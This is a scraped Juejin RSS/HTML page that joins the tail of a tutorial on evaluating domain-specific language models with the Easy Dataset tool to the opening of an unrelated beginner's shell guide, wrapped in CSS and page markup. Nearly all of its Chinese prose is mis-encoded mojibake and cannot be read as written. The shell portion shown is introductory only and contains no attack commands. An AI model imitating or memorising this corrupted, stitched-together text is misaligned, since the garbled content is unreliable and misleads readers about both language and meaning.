<p>å¦‚æœä½ æœ‰æ›´å®šåˆ¶åŒ–çš„æ¨¡å‹è¯„ä¼°éœ€æ±‚ï¼ˆå¦‚éœ€è¦å®šåˆ¶å¤„ç†çš„é£æ ¼å’Œä¾§é‡ç‚¹ã€å¸Œæœ›æ•™å¸ˆæ¨¡å‹æ›´å…³æ³¨æŸäº›ç‰¹å®šç»´åº¦ï¼‰ï¼Œå¯ä»¥åˆ°ã€æ›´å¤š-é¡¹ç›®è®¾ç½®-æç¤ºè¯é…ç½®æ¨¡å‹ã€‘å¯¹æ¨¡å‹è¯„ä¼°çš„æç¤ºè¯è¿›è¡Œæ›´æ”¹ï¼Œç³»ç»Ÿå…¨é¢å¼€æ”¾äº†è¯„ä¼°ç³»ç»Ÿçš„å…¨å¥—æç¤ºè¯ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>ä»é¢†åŸŸæ–‡çŒ®ç”Ÿæˆæµ‹è¯•é›†çš„æç¤ºè¯ï¼šåˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜ã€ç®€ç­”é¢˜ã€å¼€æ”¾é—®é¢˜çš„ç”Ÿæˆ</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95cfa6f145294b40b075218d0cc3513f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=nPwAeQdzjgV1etNYKsJIRN8JVxM%3D" alt="" loading="lazy"/></p>
<ul>
<li>ä¸åŒé¢˜ç›®æ‰§è¡Œæµ‹è¯„çš„æç¤ºè¯ï¼šä»åŸå§‹é¢˜ç›®è·å–ç­”æ¡ˆ</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99912934edb04fb7ab1319a01d33a5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=P1iXgr%2BLV1X%2Bs3AHU3peCxjLaKo%3D" alt="" loading="lazy"/></p>
<ul>
<li>LLM è¯„ä¼°æç¤ºè¯ï¼šåŒ…æ‹¬ç®€ç­”é¢˜å’Œå¼€æ”¾é—®é¢˜çš„è¯„ä¼°</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6bddf44817b4e8389f0e515f631d79c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=v2J2tU1p7ju3OR7iueeVqNNzs5o%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>å…·ä½“çš„è¯„åˆ†ç»†åˆ™åœ¨åˆ›å»ºä»»åŠ¡ä¸­æ˜¯å¯ä»¥é…ç½®çš„ï¼Œå®é™…å½±å“çš„å°±æ˜¯æç¤ºè¯ä¸­çš„ <code>{{scoreAnchors}}</code> å˜é‡ï¼Œåœ¨è¿™é‡Œçš„è®¾ç½®å¯ä»¥ç›´æ¥è¦†ç›–è¿™ä¸ªå˜é‡ï¼Œè‡ªç”±åº¦æ›´é«˜ã€‚</p>
</blockquote>
<h2 data-id="heading-19">æœ€å</h2>
<p>å¸Œæœ›é˜…è¯»å®Œæœ¬æœŸæ•™ç¨‹ï¼Œä½ å°†å­¦ä¼šä»¥ä¸‹å†…å®¹ï¼š</p>
<ol>
<li>ç†è§£é€šç”¨åŸºå‡†åœ¨å‚ç›´é¢†åŸŸçš„å±€é™æ€§ï¼Œæ˜ç¡®è¯„ä¼°çš„ä¸‰å¤§æ ¸å¿ƒç›®æ ‡ï¼ˆé€‰å‹éªŒè¯ã€å¾®è°ƒæ•ˆæœã€RAGä¼˜åŒ–ï¼‰</li>
<li>æŒæ¡ä¸‰ç±»å‚ç›´é¢†åŸŸè¯„ä¼°æ–¹æ³•çš„é€‚ç”¨åœºæ™¯ï¼ˆç¡®å®šæ€§è¯„ä¼°ã€æ–‡æœ¬ç›¸ä¼¼åº¦è¯„ä¼°ã€LLM as Judgeï¼‰</li>
<li>å­¦ä¼šå¤šæ–¹å¼æ„å»ºå‚ç›´é¢†åŸŸè¯„ä¼°æµ‹è¯•é›†ï¼ˆæ–‡çŒ®æå–ã€è®­ç»ƒé›†è½¬åŒ–ã€è‡ªå®šä¹‰å¯¼å…¥ï¼‰</li>
<li>æŒæ¡å®¢è§‚é¢˜è§„åˆ™åˆ¤åˆ†ã€ä¸»è§‚é¢˜æ•™å¸ˆæ¨¡å‹æ‰“åˆ†çš„è‡ªåŠ¨åŒ–è¯„ä¼°æ–¹æ³•</li>
<li>èƒ½è®¾è®¡å¹¶æ‰§è¡Œäººå·¥ç›²æµ‹ä»»åŠ¡ï¼Œè·å–è´´åˆå®é™…ä½“æ„Ÿçš„æ¨¡å‹å¯¹æ¯”ç»“æœ</li>
<li>å¯é€šè¿‡è‡ªå®šä¹‰æç¤ºè¯é€‚é…ä¸åŒå‚ç›´é¢†åŸŸçš„è¯„ä¼°éœ€æ±‚</li>
<li>å»ºç«‹â€œæµ‹è¯•é›†æ„å»ºâ€”è‡ªåŠ¨åŒ–è¯„ä¼°â€”äººå·¥éªŒè¯â€çš„è¯„ä¼°é—­ç¯ï¼Œå®ç°æ¨¡å‹æ•ˆæœé‡åŒ–åˆ¤æ–­</li>
</ol>
<p>å…³æ³¨ã€Šcodeç§˜å¯†èŠ±å›­ã€‹ä»æ­¤å­¦ä¹  AI ä¸è¿·è·¯ï¼Œç›¸å…³é“¾æ¥ï¼š</p>
<ul>
<li>Easy Datasetï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset" target="_blank" title="https://github.com/ConardLi/easy-dataset" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></li>
<li>AI æ•™ç¨‹å®Œæ•´æ±‡æ€»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwRâ€¦</a></li>
<li>ç›¸å…³å­¦ä¹ èµ„æºæ±‡æ€»åœ¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></li>
</ul>
<p>å¦‚æœæœ¬æœŸå¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œå¸Œæœ›å¾—åˆ°ä¸€ä¸ªå…è´¹çš„ä¸‰è¿ï¼Œæ„Ÿè°¢å¤§å®¶æ”¯æŒ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Shellå…¥é—¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7594661351514259491</link>    <guid>https://juejin.cn/post/7594661351514259491</guid>    <pubDate>2026-01-14T01:42:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594661351514259491" data-draft-id="7594667893017034767" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Shellå…¥é—¨æŒ‡å—"/> <meta itemprop="keywords" content="å…¨æ ˆ,è‡ªåŠ¨åŒ–è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-14T01:42:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lihouyi"/> <meta itemprop="url" content="https://juejin.cn/user/4365493763322599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Shellå…¥é—¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4365493763322599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lihouyi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T01:42:29.000Z" title="Wed Jan 14 2026 01:42:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Shellå…¥é—¨æŒ‡å—</h2>
<pre><code class="hljs">â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘
â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
</code></pre>
<h3 data-id="heading-1">Shellç®€ä»‹</h3>
<h4 data-id="heading-2">shell</h4>
<p>Shell æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯è¿æ¥ç”¨æˆ·ä¸ Linux/Unix æ“ä½œç³»ç»Ÿå†…æ ¸çš„<strong>æ ¸å¿ƒæ¡¥æ¢</strong>ã€‚å¯¹äºå¼€å‘è€…è€Œè¨€ï¼ŒShell å…·æœ‰ä¸å¯æ›¿ä»£çš„â€œåŒé‡äººæ ¼â€ï¼š</p>
<ul>
<li>ä½œä¸º<code>å‘½ä»¤è¯­è¨€è§£é‡Šå™¨</code>ï¼šå®ƒä¸ºç”¨æˆ·æä¾›äº†è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸æœåŠ¡çš„äº¤äº’ç•Œé¢ã€‚å½“ä½ è¾“å…¥å‘½ä»¤ï¼ˆå¦‚ ls, grepï¼‰æ—¶ï¼ŒShell è´Ÿè´£è§£é‡Šè¿™äº›æŒ‡ä»¤å¹¶ä¼ é€’ç»™å†…æ ¸æ‰§è¡Œ</li>
<li>ä½œä¸º<code>ç¨‹åºè®¾è®¡è¯­è¨€</code>ï¼šShell æ‹¥æœ‰ä¸€å¥—å®Œæ•´çš„ç¼–ç¨‹è¯­æ³•ï¼ˆå˜é‡ã€å¾ªç¯ã€æ¡ä»¶åˆ¤æ–­ç­‰ï¼‰ã€‚æˆ‘ä»¬å°†ç”± Shell è¯­æ³•ç¼–å†™çš„ç¨‹åºç§°ä¸º<code>Shell Script</code>ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨å¼€å‘å’Œè¿ç»´ä¸­å¸¸è¯´çš„â€œå†™ Shellâ€</li>
</ul>



































<table><thead><tr><th/><th>Shell</th><th>Shell Script</th></tr></thead><tbody><tr><td><strong>æœ¬è´¨</strong></td><td>å‘½ä»¤è§£é‡Šå™¨ / è¿è¡Œç¯å¢ƒ</td><td>æ–‡æœ¬æ–‡ä»¶ / é€»è¾‘ä»£ç é›†åˆ</td></tr><tr><td><strong>æ ¸å¿ƒèŒè´£</strong></td><td>æ¥æ”¶æŒ‡ä»¤ã€è°ƒç”¨å†…æ ¸ã€åé¦ˆç»“æœ</td><td>ç¼–æ’æŒ‡ä»¤ã€å¤„ç†é€»è¾‘ã€å®ç°è‡ªåŠ¨åŒ–</td></tr><tr><td><strong>äº¤äº’æ¨¡å¼</strong></td><td>å®æ—¶äº¤äº’ï¼ˆRead-Eval-Print Loopï¼‰</td><td>æ‰¹å¤„ç†æ‰§è¡Œï¼ˆç¼–å†™ -&gt; è¿è¡Œï¼‰</td></tr><tr><td><strong>ç¤ºä¾‹</strong></td><td><code>bash</code>ã€<code>zsh</code>ã€<code>sh</code></td><td><code>install.sh</code>ã€<code>backup.sh</code></td></tr><tr><td><strong>ä¾èµ–å…³ç³»</strong></td><td>è„šæœ¬è¿è¡Œçš„<strong>å®¿ä¸»/è§£é‡Šå™¨</strong></td><td>Shell èƒ½åŠ›çš„<strong>æ‰©å±•/è½½ä½“</strong></td></tr></tbody></table>
<h4 data-id="heading-3">Shellç¯å¢ƒ</h4>
<p>Shell ç¯å¢ƒå¹¶éå•çº¯çš„ä¸€ä¸ªâ€œé»‘è‰²çª—å£â€ï¼Œå®ƒæ˜¯æ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·åˆ†é…çš„ä¸€ä¸ª<strong>è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ (Runtime Context)</strong>ã€‚è¿™ä¸ªä¸Šä¸‹æ–‡å†³å®šäº†å‘½ä»¤å¦‚ä½•è¢«è§£æã€èµ„æºå¦‚ä½•è¢«åˆ†é…ä»¥åŠè¿›ç¨‹å¦‚ä½•è¢«ç®¡ç†</p>
<p>ä¸€ä¸ªå®Œæ•´çš„ Shell è¿è¡Œç¯å¢ƒé€šå¸¸ç”±ä»¥ä¸‹æ ¸å¿ƒæ¨¡å—æ„æˆï¼š</p>
<ul>
<li><code>å‘½ä»¤è§£é‡Šå™¨</code>ï¼šè´Ÿè´£è§£æå’Œæ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å‘½ä»¤</li>
<li><code>ç¯å¢ƒå˜é‡</code>ï¼šå®šä¹‰ç³»ç»Ÿè¿è¡Œæ—¶è¡Œä¸ºçš„å…¨å±€é”®å€¼å¯¹ï¼Œå†³å®šäº†å‘½ä»¤æœç´¢è·¯å¾„ã€ç”¨æˆ·èº«ä»½åŠè¯­è¨€ç¯å¢ƒç­‰</li>
